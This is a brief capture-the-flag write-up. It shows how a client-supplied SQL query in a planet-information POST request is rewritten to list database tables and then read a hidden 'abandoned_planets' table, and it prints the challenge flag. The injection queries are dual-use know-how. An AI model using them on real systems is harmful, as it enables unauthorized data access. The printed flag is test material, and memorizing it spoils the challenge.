Write-up:

1. When analyzing the GET request to /, we find a POST request used to get the
planet information to display. This request uses a SQL query we can manipulate.

2. Altering the query to
`query=SELECT table_name FROM information_schema.tables WHERE table_schema=database();`
shows us there is another table:
    ```json
    [{
        "TABLE_NAME": "abandoned_planets"
    }, {
        "TABLE_NAME": "planets"
    }]
    ```

3. `query=SELECT * FROM abandoned_planets;` shows us the flag: 
**flag{9c4dea2d8ae5681a75f8e670ac8ba999}**